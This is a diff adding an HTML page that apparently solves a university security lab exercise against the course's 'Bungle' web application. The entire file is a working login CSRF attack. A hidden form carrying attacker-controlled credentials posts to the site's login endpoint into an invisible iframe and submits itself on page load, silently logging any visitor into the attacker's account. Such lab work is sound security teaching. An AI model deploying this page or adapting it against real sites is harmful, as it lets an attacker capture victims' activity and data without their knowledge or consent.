@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Page Title</title>
+</head>
+<body>
+ <form action="http://bungle-cs461.cs.illinois.edu/login?csrfdefense=0&xssdefense=5" method="POST" name="CSFform" target ="frame"  >
+ 		<input type="hidden" name="username" value="attacker"/>
+		<input type="hidden" name="password" value="l33th4x"/>
+
+ </form>	
+  <iframe name="frame" style="display:none;"> </iframe>
+</body>
+<script type="text/javascript">
+		window.onload=function(){
+			document.CSFform.submit();
+
+		}
+
+</script>
+</html>
